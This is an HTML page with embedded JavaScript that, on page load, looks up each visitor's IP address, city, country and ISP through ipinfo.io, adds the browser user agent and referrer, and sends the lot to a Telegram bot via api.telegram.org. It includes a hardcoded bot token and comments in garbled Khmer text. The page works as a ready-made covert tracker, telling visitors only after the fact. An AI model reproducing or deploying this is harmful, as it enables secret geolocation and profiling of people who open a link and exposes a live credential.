<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Send Device Info</title>
    <script>
        let botToken = "7861802635:AAETLP6u1o8AWwgjamsFIccvYPcGnjbXdmg";  // áž”áŸ’ážáž¼ážšáž‡áž¶ Token ážšáž”ážŸáŸ‹áž¢áŸ’áž“áž€

        async function getChatId() {
            try {
                let response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
                let data = await response.json();
                
                if (data.ok && data.result.length > 0) {
                    let chatId = data.result[data.result.length - 1].message.chat.id; // áž‘áž‘áž½áž› Chat ID áž…áž»áž„áž€áŸ’ážšáŸ„áž™
                    return chatId;
                } else {
                    console.error("No chat ID found. Send a message to your bot first!");
                    return null;
                }
            } catch (error) {
                console.error("Error fetching Chat ID:", error);
                return null;
            }
        }

        async function sendDeviceInfo() {
            let chatId = await getChatId();
            if (!chatId) {
                console.error("No chat ID found. Please send a message to your bot first.");
                return;
            }

            fetch('https://ipinfo.io/json')
            .then(response => response.json())
            .then(data => {
                let ip = data.ip;
                let city = data.city;
                let region = data.region;
                let country = data.country;
                let isp = data.org;
                let userAgent = navigator.userAgent;

                let message = `ðŸ” **New Visitor Detected!**\n\n`
                            + `ðŸŒ **IP Address:** ${ip}\n`
                            + `ðŸ“ **Location:** ${city}, ${region}, ${country}\n`
                            + `ðŸ’» **ISP:** ${isp}\n`
                            + `ðŸ–¥ **Device Info:** ${userAgent}\n`
                            + `ðŸ”— **Referrer:** ${document.referrer || "Direct Access"}\n`;

                let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

                fetch(telegramUrl)
                .then(response => console.log("Device Info Sent to Telegram!"))
                .catch(error => console.error("Error sending message:", error));
            })
            .catch(error => console.error("Error fetching IP:", error));
        }

        // Auto run when page loads
        window.onload = sendDeviceInfo;
    </script>
</head>
<body>
    <h1>Welcome to My Website</h1>
    <p>Your device info has been sent to Telegram Bot automatically.</p>
</body>
</html>
